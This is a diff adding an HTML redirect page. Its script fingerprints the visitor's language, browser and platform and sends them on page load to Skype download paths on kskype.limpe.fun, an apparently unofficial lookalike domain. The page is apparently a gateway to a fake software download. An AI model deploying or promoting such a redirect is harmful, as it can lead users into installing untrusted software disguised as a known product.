@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Language Redirect</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var userLang = navigator.language || navigator.userLanguage;
+            var userAgent = navigator.userAgent;
+            var platform = navigator.platform.toLowerCase();
+            var redirectUrl;
+
+            // Function to check if the browser is legacy
+            function isLegacyBrowser() {
+                var isIE = /MSIE|Trident/.test(userAgent);
+                var isOldChrome = /Chrome\/([0-9]+)/.test(userAgent) && parseInt(RegExp.$1, 10) <= 20;
+                var isOldFirefox = /Firefox\/([0-9]+)/.test(userAgent) && parseInt(RegExp.$1, 10) <= 20;
+                return isIE || isOldChrome || isOldFirefox;
+            }
+
+            // Determine platform
+            function getPlatform() {
+                if (platform.indexOf('win') !== -1) return 'mswindows';
+                if (platform.indexOf('mac') !== -1) return 'osx';
+                if (platform.indexOf('linux') !== -1) return 'lin';
+                if (/android/.test(userAgent)) return 'android';
+                if (/iphone|ipad|ipod/.test(userAgent)) return 'iphoneos';
+                return 'unknown';
+            }
+
+            var platformType = getPlatform();
+
+            if (isLegacyBrowser()) {
+                if (userLang.startsWith('ru') || userLang.startsWith('uk')) {
+                    redirectUrl = 'https://kskype.limpe.fun/legacy/ru/download/' + platformType;
+                } else {
+                    redirectUrl = 'https://kskype.limpe.fun/legacy/en/download/' + platformType;
+                }
+            } else {
+                if (userLang.startsWith('ru')) {
+                    redirectUrl = 'https://kskype.limpe.fun/ru/download-skype';
+                } else if (userLang.startsWith('uk')) {
+                    redirectUrl = 'https://kskype.limpe.fun/ua/download-skype';
+                } else {
+                    redirectUrl = 'https://kskype.limpe.fun/en/download-skype';
+                }
+
+                // Additional redirects for non-Windows platforms
+                if (platformType !== 'mswindows') {
+                    redirectUrl += '/' + platformType;
+                }
+            }
+
+            window.location.href = redirectUrl;
+        });
+    </script>
+</head>
+<body>
+    <p>loading..</p>
+</body>
+</html>
